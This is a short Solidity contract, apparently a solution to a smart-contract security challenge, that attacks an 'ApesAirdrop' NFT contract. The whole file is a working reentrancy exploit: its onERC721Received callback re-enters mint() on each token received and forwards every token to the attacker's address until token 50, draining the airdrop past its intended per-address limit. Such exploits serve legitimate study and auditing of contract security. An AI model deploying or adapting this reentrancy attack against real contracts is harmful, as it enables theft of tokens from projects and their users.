// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ApesAirdrop} from "./ApesAirdrop.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackApesAirdrop is IERC721Receiver {
    ApesAirdrop apesAirdrop;
    address owner;

    constructor(address _apesAirdrop) payable {
        apesAirdrop = ApesAirdrop(_apesAirdrop);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "Only Owner");
        apesAirdrop.mint();
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4) {
        if (tokenId == 50) {
            apesAirdrop.transferFrom(address(this), owner, tokenId);
            return this.onERC721Received.selector;
        }

        apesAirdrop.mint();
        apesAirdrop.transferFrom(address(this), owner, tokenId);
        return this.onERC721Received.selector;
    }
}
